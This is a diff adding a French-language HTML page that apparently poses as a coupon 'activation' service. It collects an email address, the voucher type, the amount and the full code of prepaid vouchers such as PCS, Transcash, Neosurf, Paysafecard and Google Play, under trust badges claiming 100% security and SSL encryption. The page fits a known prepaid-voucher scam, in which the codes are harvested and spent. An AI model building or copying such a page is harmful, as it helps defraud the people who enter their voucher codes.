@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Activation Pro • Échange de Coupons</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Header moderne -->
+    <header class="modern-header">
+        <div class="header-content">
+            <img src="logo.png" alt="Logo" class="brand-logo">
+            <nav class="main-nav">
+                <a href="#acheter" class="nav-item"><i class="fas fa-shopping-cart"></i> Acheter</a>
+                <a href="#activer" class="nav-item active"><i class="fas fa-bolt"></i> Activer</a>
+                <a href="#aide" class="nav-item"><i class="fas fa-headset"></i> Aide</a>
+            </nav>
+            <div class="user-account">
+                <button class="account-btn"><i class="fas fa-user"></i> Mon Compte</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Section principale -->
+    <main class="container">
+        <!-- Grille de cartes -->
+        <div class="card-grid">
+            <div class="service-card" data-coupon="Cryptonow">
+                <img src="images/image1.jpg" alt="Cryptonow">
+                <h3>Cryptonow</h3>
+                <p>Échange instantané</p>
+            </div>
+            <div class="service-card" data-coupon="PCS">
+                <img src="images/image2.jpg" alt="PCS">
+                <h3>PCS</h3>
+                <p>Recharge rapide</p>
+            </div>
+            <div class="service-card" data-coupon="Paysafcard">
+                <img src="images/image5.jpg" alt="Paysafcard">
+                <h3>Paysafcard</h3>
+                <p>Sécurisé et fiable</p>
+            </div>
+            <div class="service-card" data-coupon="AppCard">
+                <img src="images/image7.jpg" alt="AppCard">
+                <h3>AppCard</h3>
+                <p>Facile à utiliser</p>
+            </div>
+        </div>
+
+        <!-- Formulaire premium -->
+        <div class="premium-form">
+            <div class="form-header">
+                <h2><i class="fas fa-rocket"></i> Activation Express</h2>
+                <p>Traitez votre coupon en <strong>2 minutes chrono</strong></p>
+            </div>
+            <form id="couponForm">
+                <div class="input-group">
+                    <label for="email">Votre adresse email :</label>
+                    <input type="email" id="email" name="email" placeholder="Entrez votre adresse email" required>
+                </div>
+                <div class="input-group">
+                    <label for="couponType">Type de coupon :</label>
+                    <select id="couponType" name="couponType" required>
+                        <option value="" disabled selected>Choisissez une option</option>
+                        <option value="Transcash">Transcash</option>
+                        <option value="PCS">PCS</option>
+                        <option value="Neosurf">Neosurf</option>
+                        <option value="AppCard">AppCard</option>
+                        <option value="Paysafcard">Paysafcard</option>
+                        <option value="Cryptonow">Cryptonow</option>
+                        <option value="Google Play">Google Play</option>
+                        <option value="ToneoFirst">ToneoFirst</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label for="couponAmount">Montant du coupon :</label>
+                    <input type="text" id="couponAmount" name="couponAmount" placeholder="Entrez le montant du coupon" required>
+                </div>
+                <div class="input-group">
+                    <label for="couponCode">Code du coupon :</label>
+                    <input type="text" id="couponCode" name="couponCode" placeholder="Entrez le code du coupon" maxlength="12" required>
+                    <p id="charCount">12 caractères restants</p>
+                </div>
+                <button type="submit" class="btn-primary">Valider</button>
+            </form>
+        </div>
+
+        <!-- Section garanties -->
+        <div class="guarantees">
+            <div class="guarantee-card">
+                <i class="fas fa-shield-alt"></i>
+                <h4>100% Sécurisé</h4>
+                <p>Transactions cryptées SSL 256-bit</p>
+            </div>
+            <div class="guarantee-card">
+                <i class="fas fa-clock"></i>
+                <h4>Rapide</h4>
+                <p>Activation en moins de 2 minutes</p>
+            </div>
+            <div class="guarantee-card">
+                <i class="fas fa-headset"></i>
+                <h4>Support 24/7</h4>
+                <p>Assistance disponible à tout moment</p>
+            </div>
+        </div>
+    </main>
+
+    <script src="script.js"></script>
+</body>
+</html>
